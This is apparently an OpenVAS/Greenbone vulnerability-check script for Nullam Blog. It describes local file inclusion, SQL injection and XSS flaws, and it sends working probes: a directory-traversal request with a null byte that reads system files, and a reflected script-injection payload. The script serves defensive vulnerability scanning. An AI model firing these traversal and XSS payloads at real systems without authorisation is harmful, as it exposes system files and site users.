if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.900888" );
	script_version( "2021-09-01T12:57:33+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 12:57:33 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2009-10-31 09:54:01 +0100 (Sat, 31 Oct 2009)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2009-3664", "CVE-2009-3665", "CVE-2009-3666" );
	script_name( "Nullam Blog Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/36648" );
	script_xref( name: "URL", value: "http://www.milw0rm.com/exploits/9625" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/53217" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to disclose sensitive information
  and conduct cross-site scripting and SQL injection attacks." );
	script_tag( name: "affected", value: "Nullam Blog version prior to 0.1.3 on Linux." );
	script_tag( name: "insight", value: "- Input passed to the 'p' and 's' parameter in index.php is not properly
  verified before being used to include files. This can be exploited to include arbitrary files from local resources.

  - Input passed to the 'i' and 'v' parameter in index.php is not properly sanitised before being used in SQL queries.
  This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

  - Input passed to the 'e' parameter in index.php is not properly sanitised before being returned to the user.
  This can be exploited to execute arbitrary HTML and script code in a user's browser session in the context
  of an affected site." );
	script_tag( name: "solution", value: "Upgrade to Nullam Blog version 0.1.3 or later." );
	script_tag( name: "summary", value: "This host is running Nullam Blog and is prone to multiple
  vulnerabilities." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/", "/nullam", "/blog", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes1 = http_get_cache( item: dir + "/index.php", port: port );
	if(IsMatchRegexp( rcvRes1, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes1, "<title>Nullam</title>" )){
		for file in keys( files ) {
			for item in make_list( "s",
				 "p" ) {
				url = dir + "/index.php?" + item + "=../../../../../../" + files[file] + "%00";
				if(http_vuln_check( port: port, url: url, pattern: file )){
					report = http_report_vuln_url( port: port, url: url );
					security_message( port: port, data: report );
					exit( 0 );
				}
			}
		}
		url = dir + "/index.php?p=error&e=<script>alert" + "('VT-SQL-Injection-Test');</script>";
		sndReq2 = http_get( item: url, port: port );
		rcvRes2 = http_keepalive_send_recv( port: port, data: sndReq2 );
		if(IsMatchRegexp( rcvRes2, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes2, "<script>alert('VT-SQL-Injection-Test');</script>" )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

